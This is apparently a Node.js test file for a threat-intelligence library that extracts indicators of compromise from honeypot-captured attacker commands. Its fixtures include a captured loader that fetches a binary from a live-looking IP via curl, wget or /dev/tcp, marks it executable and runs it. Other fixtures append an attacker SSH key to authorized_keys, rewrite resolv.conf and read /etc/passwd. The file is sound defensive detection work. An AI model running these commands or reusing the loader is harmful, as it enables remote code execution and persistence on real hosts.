const test = require('node:test');
const assert = require('node:assert');
const {
  extractIocs, extractC2Endpoints, extractSshKeys, extractConfigBlobs,
  extractDroppedCredentials, extractNameservers, isRoutableIpv4,
} = require('../lib/iocs');

/** The real loader, trimmed in the middle. Three fallbacks, one endpoint. */
const LOADER =
  'nohup $SHELL -c "curl http://120.77.178.159:9438/linux -o /tmp/NDJLWZSP90; ' +
  'if [ ! -f /tmp/NDJLWZSP90 ]; then wget http://120.77.178.159:9438/linux -O /tmp/NDJLWZSP90; fi; ' +
  'if [ ! -f /tmp/NDJLWZSP90 ]; then exec 6<>/dev/tcp/120.77.178.159/9438 && echo -n \'GET /linux\' >&6 ' +
  '&& cat 0<&6 > /tmp/NDJLWZSP90 ; chmod +x /tmp/NDJLWZSP90 && /tmp/NDJLWZSP90 ' +
  'h6CgxsoDx6J' + 'A'.repeat(80) + 'LDs=; fi; echo 123456 > /tmp/.opass" &';

test('one endpoint, not three, from a command with three fallbacks', () => {
  // curl, the wget fallback and the bash /dev/tcp fallback all name the same
  // server. Counting each would inflate every sighting by the number of
  // fallbacks the malware happens to use, which is a property of the malware
  // and not of our data.
  const found = extractC2Endpoints(LOADER);
  assert.strictEqual(found.length, 1);
  assert.strictEqual(found[0].value, '120.77.178.159:9438');
  assert.strictEqual(found[0].meta.port, 9438);
});

test('the /dev/tcp form is recognised as the same endpoint shape', () => {
  const devtcp = 'exec 6<>/dev/tcp/8.222.207.98/60149 && echo -n \'GET /linux\' >&6';
  assert.deepStrictEqual(
    extractC2Endpoints(devtcp).map((i) => i.value), ['8.222.207.98:60149']
  );
});

test('private and loopback addresses are not reported as infrastructure', () => {
  // Cowrie's own log embeds 192.168.50.10:22, and a bot fetching from
  // 127.0.0.1 is describing the victim, not a server anyone can act on.
  for (const ip of ['127.0.0.1', '192.168.50.10', '10.1.2.3', '172.16.0.9', '169.254.1.1', '0.0.0.0']) {
    assert.strictEqual(isRoutableIpv4(ip), false, `${ip} should not be routable`);
  }
  for (const ip of ['8.8.8.8', '120.77.178.159', '172.15.0.1', '172.32.0.1']) {
    assert.strictEqual(isRoutableIpv4(ip), true, `${ip} should be routable`);
  }
  assert.strictEqual(extractC2Endpoints('curl http://192.168.50.10:22/x').length, 0);
});

test('octets above 255 are not addresses', () => {
  assert.strictEqual(extractC2Endpoints('build 999.1.1.1:8080 now').length, 0);
});

test('ssh keys deduplicate on the body, not the comment', () => {
  // The same key has been seen with different comments. One key is one
  // indicator however it is labelled.
  const body = 'AAAAB3NzaC1yc2E' + 'B'.repeat(60);
  const cmd = `echo "ssh-rsa ${body} mdrfckr" >> .ssh/authorized_keys; echo "ssh-rsa ${body} other" >> x`;
  const keys = extractSshKeys(cmd);
  assert.strictEqual(keys.length, 1);
  assert.strictEqual(keys[0].value, body);
  assert.strictEqual(keys[0].meta.comment, 'mdrfckr');
  assert.strictEqual(keys[0].meta.algo, 'ssh-rsa');
});

test('the config blob is captured and is not confused with an ssh key', () => {
  const blobs = extractConfigBlobs(LOADER);
  assert.strictEqual(blobs.length, 1);
  assert.ok(blobs[0].value.length >= 60);

  // A key body passed in the same shape must not be filed as a config blob.
  const keyish = '/tmp/x AAAA' + 'C'.repeat(80);
  assert.strictEqual(extractConfigBlobs(keyish).length, 0);
});

test('the password the bot writes to .opass is captured', () => {
  assert.deepStrictEqual(
    extractDroppedCredentials(LOADER).map((i) => i.value), ['123456']
  );
});

test('hijacked resolvers are captured, private ones are not', () => {
  assert.deepStrictEqual(
    extractNameservers('echo "nameserver 8.8.4.4" > /etc/resolv.conf').map((i) => i.value),
    ['8.8.4.4']
  );
  assert.strictEqual(extractNameservers('echo "nameserver 192.168.1.1" > /etc/resolv.conf').length, 0);
});

test('a full pass over the real loader yields one of each expected type', () => {
  const byType = {};
  for (const i of extractIocs(LOADER)) byType[i.type] = (byType[i.type] || 0) + 1;
  assert.strictEqual(byType.c2_endpoint, 1);
  assert.strictEqual(byType.config_blob, 1);
  assert.strictEqual(byType.dropped_credential, 1);
  // curl and wget name the same URL twice; it is one indicator.
  assert.strictEqual(byType.url, 1);
});

test('ordinary recon commands yield nothing', () => {
  for (const c of ['uname -a', 'cat /etc/passwd', 'crontab -l', 'w', 'free -m']) {
    assert.deepStrictEqual(extractIocs(c), [], `unexpected indicator from: ${c}`);
  }
});

test('degenerate input never throws', () => {
  for (const c of [null, undefined, '', 42, {}]) {
    assert.doesNotThrow(() => extractIocs(c));
    assert.deepStrictEqual(extractIocs(c), []);
  }
});
